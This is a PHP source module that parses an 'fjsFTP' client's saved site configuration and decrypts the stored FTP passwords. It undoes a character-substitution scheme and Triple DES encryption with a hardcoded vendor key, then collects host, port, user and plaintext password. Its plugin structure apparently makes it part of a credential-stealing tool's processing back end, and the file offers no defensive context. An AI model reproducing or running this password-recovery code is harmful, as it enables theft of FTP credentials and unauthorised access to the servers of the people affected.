<?php
class Module_fjsftp extends Module_
{
    protected function codeCharacter($character)
    {
        $code = $character;
        if ($character == "a")
        {
            $code = "x";
        }
        if ($character == "b")
        {
            $code = "o";
        }
        if ($character == "c")
        {
            $code = "r";
        }
        if ($character == "d")
        {
            $code = "s";
        }
        if ($character == "e")
        {
            $code = "v";
        }
        if ($character == "f")
        {
            $code = "z";
        }
        if ($character == "g")
        {
            $code = "q";
        }
        if ($character == "h")
        {
            $code = "t";
        }
        if ($character == "i")
        {
            $code = "u";
        }
        if ($character == "j")
        {
            $code = "n";
        }
        if ($character == "k")
        {
            $code = "p";
        }
        if ($character == "l")
        {
            $code = "y";
        }
        if ($character == "m")
        {
            $code = "w";
        }
        if ($character == "n")
        {
            $code = "j";
        }
        if ($character == "o")
        {
            $code = "b";
        }
        if ($character == "p")
        {
            $code = "k";
        }
        if ($character == "q")
        {
            $code = "g";
        }
        if ($character == "r")
        {
            $code = "c";
        }
        if ($character == "s")
        {
            $code = "d";
        }
        if ($character == "t")
        {
            $code = "h";
        }
        if ($character == "u")
        {
            $code = "i";
        }
        if ($character == "v")
        {
            $code = "e";
        }
        if ($character == "w")
        {
            $code = "m";
        }
        if ($character == "x")
        {
            $code = "a";
        }
        if ($character == "y")
        {
            $code = "l";
        }
        if ($character == "z")
        {
            $code = "f";
        }
        if ($character == "A")
        {
            $code = "X";
        }
        if ($character == "B")
        {
            $code = "O";
        }
        if ($character == "C")
        {
            $code = "R";
        }
        if ($character == "D")
        {
            $code = "S";
        }
        if ($character == "E")
        {
            $code = "V";
        }
        if ($character == "F")
        {
            $code = "Z";
        }
        if ($character == "G")
        {
            $code = "Q";
        }
        if ($character == "H")
        {
            $code = "T";
        }
        if ($character == "I")
        {
            $code = "U";
        }
        if ($character == "J")
        {
            $code = "N";
        }
        if ($character == "K")
        {
            $code = "P";
        }
        if ($character == "L")
        {
            $code = "Y";
        }
        if ($character == "M")
        {
            $code = "W";
        }
        if ($character == "N")
        {
            $code = "J";
        }
        if ($character == "O")
        {
            $code = "B";
        }
        if ($character == "P")
        {
            $code = "K";
        }
        if ($character == "Q")
        {
            $code = "G";
        }
        if ($character == "R")
        {
            $code = "C";
        }
        if ($character == "S")
        {
            $code = "D";
        }
        if ($character == "T")
        {
            $code = "H";
        }
        if ($character == "U")
        {
            $code = "I";
        }
        if ($character == "V")
        {
            $code = "E";
        }
        if ($character == "W")
        {
            $code = "M";
        }
        if ($character == "X")
        {
            $code = "A";
        }
        if ($character == "Y")
        {
            $code = "L";
        }
        if ($character == "Z")
        {
            $code = "F";
        }
        if ($character == "1")
        {
            $code = "7";
        }
        if ($character == "2")
        {
            $code = "6";
        }
        if ($character == "3")
        {
            $code = "8";
        }
        if ($character == "4")
        {
            $code = "0";
        }
        if ($character == "5")
        {
            $code = "9";
        }
        if ($character == "6")
        {
            $code = "2";
        }
        if ($character == "7")
        {
            $code = "1";
        }
        if ($character == "8")
        {
            $code = "3";
        }
        if ($character == "9")
        {
            $code = "5";
        }
        if ($character == "0")
        {
            $code = "4";
        }

        return  $code;
    }

    protected function OldDecrypt($Source)
    {
        $result = '';
        for ($i = 0; $i < strlen($Source); $i++)
        {
            $character = substr($Source, $i, 1);
            $result = $result . $this->codeCharacter($character);
        }

        return $result;
    }
    protected function Decrypt($Source)
    {
        if (strlen($Source) == 0)
            return '';

        if(substr($Source, 0, 4) == "****")
            $Source = substr($Source, 4);
        else
            return $this->OldDecrypt(substr($Source, 3));

        $Source = stripslashes ($Source);

        $Source = base64_decode($Source);
        if ($Source == FALSE)
            return '';

        $Key = "This is hitek software specific phrase used to encrypt. NEVER CHANGE THIS phrase";
        $CleanPass = '';

        $McryptModule = mcrypt_module_open(MCRYPT_TRIPLEDES, '', 'ecb', '');
        $IV_ 		  = mcrypt_create_iv(mcrypt_enc_get_iv_size($McryptModule), MCRYPT_RAND);
        $CleanPass    = FixNonPrintable(mcrypt_decrypt(MCRYPT_TRIPLEDES, $Key, $Source, 'ecb', $IV_));
        mcrypt_module_close($McryptModule);
        return $CleanPass;
    }

    protected function ProcessfjsFTP($Source)
    {
        $Lines = parse_lines($Source);

        $Results = array();
        foreach ($Lines as $Line)
        {
            $Data = explode("=", $Line, 2);
            if( count($Data) == 2 && isset($Data[1]))
            {
                $Data2 = explode("_", $Data[0]);

                if(count($Data2) == 2 && isset($Data2[1]))
                    $Results[$Data2[0]][$Data2[1]] = $Data[1];
            }
        }
        foreach ($Results as $Element)
        {
            if(isset($Element['password']))
            {
                $User = Assign_($Element['username']);
                error_reporting(NULL);
                $Pass = $this->Decrypt($Element['password']);
                error_reporting(E_ALL);
                $Host = Assign_($Element['host']);
                $Port = Assign_($Element['port']);
                $Prot = FALSE;

                if(isset($Element['sshContext']))
                    $Prot = TRUE;

                $this->add_ftp($this->append_port($this->ftp_force_ssh($Host, $Prot == TRUE) , $Port), $User, $Pass);
            }
        }

        unset($Results);
    }

    protected function ProcessEncFile($Data)
    {
        if(strlen($Data) < 5)
            return;

        $Data_ = explode("=", $Data);
        if(isset($Data_[1]))
            $this->set_options("Key", stripslashes ($Data_[1]));

        unset($Data_);
    }

    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
            $this->ProcessEncFile($Data);
            break;
        case 1:
            $this->ProcessfjsFTP($Data); //Unique pass
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}
